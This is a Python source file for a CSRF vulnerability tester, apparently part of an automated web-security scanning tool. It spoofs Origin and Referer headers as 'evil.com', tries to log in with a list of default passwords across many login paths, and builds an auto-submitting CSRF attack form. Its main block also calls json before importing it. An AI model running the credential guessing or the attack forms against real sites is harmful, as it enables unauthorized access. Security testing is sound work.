#!/usr/bin/env python3
"""CSRF Tester

Tests for Cross-Site Request Forgery (CSRF) vulnerabilities:
- CSRF token presence and validation
- SameSite cookie protection
- Origin/Referer header validation
- PoC HTML form generation
"""

import os
import time
import requests
from typing import Dict, Any, Optional, List
from urllib.parse import urlparse, urljoin


def test_csrf_token_presence(endpoint: str, method: str = "POST") -> Dict[str, Any]:
    """Test if endpoint requires CSRF token
    
    Args:
        endpoint: Target endpoint URL
        method: HTTP method
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "csrf_token_presence",
        "requires_token": False,
        "token_parameter": None,
        "evidence": None
    }
    
    # Try request without token
    try:
        if method.upper() == "POST":
            resp = requests.post(endpoint, data={}, timeout=10)
        elif method.upper() == "PUT":
            resp = requests.put(endpoint, data={}, timeout=10)
        elif method.upper() == "DELETE":
            resp = requests.delete(endpoint, timeout=10)
        else:
            resp = requests.get(endpoint, timeout=10)
        
        # Check response for CSRF token indicators
        response_text = resp.text.lower()
        csrf_indicators = [
            "csrf", "token", "authenticity", "form_token",
            "csrf_token", "_token", "csrfmiddlewaretoken"
        ]
        
        for indicator in csrf_indicators:
            if indicator in response_text:
                result["requires_token"] = True
                result["token_parameter"] = indicator
                result["evidence"] = {
                    "status_code": resp.status_code,
                    "indicator_found": indicator,
                    "response_snippet": resp.text[:500]
                }
                break
        
        # Check if request was rejected (might indicate token required)
        if resp.status_code in [403, 400] and "csrf" in response_text:
            result["requires_token"] = True
            result["evidence"] = {
                "status_code": resp.status_code,
                "note": "Request rejected, CSRF token may be required"
            }
            
    except Exception as e:
        result["evidence"] = {"error": str(e)}
    
    return result


def _try_get_session(base_url: str) -> Optional[requests.Session]:
    """Try to get an authenticated session by logging in.
    
    Args:
        base_url: Base URL of the application
        
    Returns:
        Session with cookies if login successful, None otherwise
    """
    from urllib.parse import urljoin
    session = requests.Session()
    
    # More comprehensive login URL list
    login_urls = [
        "/login", "/api/login", "/auth/login", "/signin", "/api/signin",
        "/user/login", "/users/login", "/account/login", "/session/new",
        "/api/auth/login", "/api/v1/login", "/api/v1/auth/login",
    ]
    
    # Test credentials including common lab defaults
    test_credentials = [
        {"username": "alice", "password": "alice123"},
        {"username": "alice", "password": "password"},
        {"username": "alice", "password": "alice"},
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "admin123"},
        {"username": "admin", "password": "password"},
        {"username": "test", "password": "test"},
        {"username": "test", "password": "password"},
        {"username": "user", "password": "user"},
        {"username": "user", "password": "password"},
    ]
    
    for login_url in login_urls:
        full_url = urljoin(base_url, login_url)
        
        # Try form login with different credential formats
        for creds in test_credentials:
            try:
                # Standard username/password
                resp = session.post(full_url, data=creds, timeout=5, allow_redirects=True)
                if resp.status_code in [200, 302] and session.cookies:
                    return session
                
                # Username-only login (some labs)
                resp = session.post(full_url, data={"username": creds["username"]}, timeout=5, allow_redirects=True)
                if resp.status_code in [200, 302] and session.cookies:
                    return session
                
                # JSON login
                resp = session.post(
                    full_url, 
                    json=creds, 
                    headers={"Content-Type": "application/json"},
                    timeout=5, 
                    allow_redirects=True
                )
                if resp.status_code in [200, 302] and session.cookies:
                    return session
                    
                # Email-based login
                email_creds = {"email": f"{creds['username']}@example.com", "password": creds["password"]}
                resp = session.post(full_url, data=email_creds, timeout=5, allow_redirects=True)
                if resp.status_code in [200, 302] and session.cookies:
                    return session
                    
            except Exception:
                continue
    
    # Try quick-login style URLs (some test labs support this)
    quick_login_urls = [
        "/login/alice", "/login/admin", "/login/user",
        "/api/login/alice", "/api/login/admin",
    ]
    for quick_url in quick_login_urls:
        try:
            full_url = urljoin(base_url, quick_url)
            resp = session.get(full_url, timeout=5, allow_redirects=True)
            if resp.status_code in [200, 302] and session.cookies:
                return session
            resp = session.post(full_url, timeout=5, allow_redirects=True)
            if resp.status_code in [200, 302] and session.cookies:
                return session
        except Exception:
            continue
    
    return None


def test_csrf_protection(
    endpoint: str,
    method: str = "POST",
    auth_context: Optional[Dict] = None,
    session: Optional[requests.Session] = None
) -> Dict[str, Any]:
    """Test CSRF protection mechanisms
    
    Args:
        endpoint: Target endpoint URL
        method: HTTP method
        auth_context: Optional authentication context (cookies, headers)
        session: Optional authenticated session
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "csrf_protection",
        "vulnerable": False,
        "protection_mechanisms": [],
        "evidence": None
    }
    
    # Build request with auth context
    headers = {}
    cookies = {}
    if auth_context:
        headers.update(auth_context.get("headers", {}))
        cookies.update(auth_context.get("cookies", {}))
    
    # Use session cookies if available
    req_session = session or requests.Session()
    if session:
        cookies.update(dict(session.cookies))
    
    # Test 1: Check SameSite cookie attribute
    if cookies:
        for name, value in cookies.items():
            if len(value) < 32 and ("session" in name.lower() or "token" in name.lower()):
                # Short session token might be predictable
                result["protection_mechanisms"].append("weak_session_token")
    
    # Test 2: Check Origin header validation
    # Try request without Origin header
    try:
        if method.upper() == "POST":
            resp1 = req_session.post(endpoint, data={"test": "csrf_test"}, headers=headers, cookies=cookies, timeout=10)
        elif method.upper() == "DELETE":
            resp1 = req_session.delete(endpoint, headers=headers, cookies=cookies, timeout=10)
        elif method.upper() == "PUT":
            resp1 = req_session.put(endpoint, data={"test": "csrf_test"}, headers=headers, cookies=cookies, timeout=10)
        else:
            resp1 = req_session.get(endpoint, headers=headers, cookies=cookies, timeout=10)
        
        # If we get 401, the endpoint requires authentication - this is still CSRF relevant info
        # but we can't test without auth. Check if endpoint accepts cross-origin.
        
        # Try request with malicious Origin header
        headers_with_origin = headers.copy()
        headers_with_origin["Origin"] = "https://evil.com"
        
        if method.upper() == "POST":
            resp2 = req_session.post(endpoint, data={"test": "csrf_test"}, headers=headers_with_origin, cookies=cookies, timeout=10)
        elif method.upper() == "DELETE":
            resp2 = req_session.delete(endpoint, headers=headers_with_origin, cookies=cookies, timeout=10)
        elif method.upper() == "PUT":
            resp2 = req_session.put(endpoint, data={"test": "csrf_test"}, headers=headers_with_origin, cookies=cookies, timeout=10)
        else:
            resp2 = req_session.get(endpoint, headers=headers_with_origin, cookies=cookies, timeout=10)
        
        # If both requests get the same response (regardless of auth status),
        # Origin header is not being validated
        if resp1.status_code == resp2.status_code:
            # Check if response doesn't reject cross-origin
            response_text = resp2.text.lower()
            if "origin" not in response_text and "csrf" not in response_text:
                result["vulnerable"] = True
                result["evidence"] = {
                    "status_code": resp1.status_code,
                    "status_code_with_evil_origin": resp2.status_code,
                    "note": "No Origin header validation detected - CSRF may be possible"
                }
                
                # Even without auth, we can detect missing CSRF protection
                if resp1.status_code == 401:
                    result["evidence"]["auth_required"] = True
                    result["evidence"]["note"] = "Missing Origin validation on auth-protected endpoint - CSRF attack possible if victim is authenticated"
            
        elif resp2.status_code >= 400 and resp1.status_code < 400:
            result["protection_mechanisms"].append("origin_header_validation")
            
    except Exception as e:
        result["evidence"] = {"error": str(e)}
    
    # Test 3: Check Referer header validation
    try:
        headers_with_referer = headers.copy()
        headers_with_referer["Referer"] = "https://evil.com/attack.html"
        
        if method.upper() == "POST":
            resp3 = req_session.post(endpoint, data={"test": "csrf_test"}, headers=headers_with_referer, cookies=cookies, timeout=10)
        elif method.upper() == "DELETE":
            resp3 = req_session.delete(endpoint, headers=headers_with_referer, cookies=cookies, timeout=10)
        elif method.upper() == "PUT":
            resp3 = req_session.put(endpoint, data={"test": "csrf_test"}, headers=headers_with_referer, cookies=cookies, timeout=10)
        else:
            resp3 = req_session.get(endpoint, headers=headers_with_referer, cookies=cookies, timeout=10)
        
        # Check if request with evil Referer is accepted
        response_text = resp3.text.lower()
        if "referer" not in response_text and "origin" not in response_text:
            if not result["vulnerable"]:
                result["vulnerable"] = True
                result["evidence"] = {}
            result["evidence"]["referer_validation"] = "missing"
            result["evidence"]["status_code_with_evil_referer"] = resp3.status_code
            
    except Exception as e:
        pass
    
    # Test 4: Check for missing CSRF token in form
    try:
        # Get the page that might contain the form
        resp_page = req_session.get(endpoint.rsplit("/", 1)[0] or endpoint, timeout=10)
        page_text = resp_page.text.lower()
        
        # Check if page has forms without CSRF token
        if "<form" in page_text:
            csrf_indicators = ["csrf", "_token", "authenticity_token", "csrfmiddlewaretoken"]
            has_csrf = any(ind in page_text for ind in csrf_indicators)
            
            if not has_csrf:
                if not result["vulnerable"]:
                    result["vulnerable"] = True
                    result["evidence"] = {}
                result["evidence"]["csrf_token_in_form"] = "missing"
    except Exception:
        pass
    
    return result


def generate_csrf_poc(
    endpoint: str,
    method: str = "POST",
    form_data: Optional[Dict[str, str]] = None
) -> str:
    """Generate CSRF PoC HTML form
    
    Args:
        endpoint: Target endpoint URL
        method: HTTP method
        form_data: Optional form data to include
        
    Returns:
        HTML string with CSRF PoC
    """
    if not form_data:
        form_data = {}
    
    # Build form fields
    form_fields = ""
    for key, value in form_data.items():
        form_fields += f'    <input type="hidden" name="{key}" value="{value}">\n'
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>This form will automatically submit to: {endpoint}</p>
    <form id="csrf_form" action="{endpoint}" method="{method.upper()}">
{form_fields}
        <input type="submit" value="Submit">
    </form>
    <script>
        // Auto-submit form
        document.getElementById('csrf_form').submit();
    </script>
</body>
</html>"""
    
    return html


def validate_csrf(
    discovery_data: Dict[str, Any],
    auth_context: Optional[Dict] = None
) -> Dict[str, Any]:
    """Main validation function for CSRF vulnerabilities
    
    Args:
        discovery_data: Discovery data containing endpoints (from csrf_discovery.py)
        auth_context: Optional authentication context
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": [],
        "poc_html": []
    }
    
    # Get state-changing endpoints from discovery data
    endpoints = discovery_data.get("csrf_prone_endpoints", [])
    if not endpoints:
        endpoints = discovery_data.get("state_changing_endpoints", [])
    
    if not endpoints:
        return results
    
    # Try to get base URL and authenticate
    base_url = discovery_data.get("base_url", "")
    session = None
    if base_url:
        session = _try_get_session(base_url)
    
    # Test each endpoint
    for endpoint_info in endpoints:
        endpoint_url = endpoint_info.get("url")
        method = endpoint_info.get("method", "POST")
        
        if not endpoint_url:
            continue
        
        # If no session yet, try to get one from endpoint base URL
        if not session and endpoint_url:
            from urllib.parse import urlparse as csrf_urlparse
            parsed = csrf_urlparse(endpoint_url)
            endpoint_base = f"{parsed.scheme}://{parsed.netloc}"
            session = _try_get_session(endpoint_base)
        
        # Test CSRF token presence
        token_test = test_csrf_token_presence(endpoint_url, method)
        results["tests_run"] += 1
        
        # Test CSRF protection with session
        protection_test = test_csrf_protection(endpoint_url, method, auth_context, session)
        results["tests_run"] += 1
        
        if protection_test["vulnerable"]:
            results["vulnerable"] = True
            finding = {
                "type": "csrf",
                "url": endpoint_url,
                "endpoint": endpoint_url,
                "method": method,
                "vulnerable": True,
                "token_required": token_test.get("requires_token", False),
                "protection_mechanisms": protection_test.get("protection_mechanisms", []),
                "evidence": protection_test.get("evidence"),
            }
            results["findings"].append(finding)
            
            # Generate PoC HTML
            poc_html = generate_csrf_poc(endpoint_url, method)
            results["poc_html"].append({
                "endpoint": endpoint_url,
                "method": method,
                "html": poc_html
            })
    
    return results


if __name__ == "__main__":
    import argparse
    
    ap = argparse.ArgumentParser(description="CSRF Tester")
    ap.add_argument("--target", required=True, help="Target base URL")
    ap.add_argument("--discovery-data", help="Path to CSRF discovery data JSON file")
    ap.add_argument("--output", help="Output JSON file")
    args = ap.parse_args()
    
    # Load discovery data
    discovery_data = {"csrf_prone_endpoints": []}
    if args.discovery_data and os.path.exists(args.discovery_data):
        with open(args.discovery_data, "r", encoding="utf-8") as fh:
            discovery_data = json.load(fh)
    
    result = validate_csrf(discovery_data)
    
    # Save results
    if args.output:
        out_path = args.output
    else:
        parsed = urlparse(args.target)
        host = parsed.netloc.replace(":", "_")
        out_path = f"csrf_validation_{host}.json"
    
    os.makedirs(os.path.dirname(out_path) if os.path.dirname(out_path) else ".", exist_ok=True)
    
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    import json
    print(json.dumps(result, indent=2))

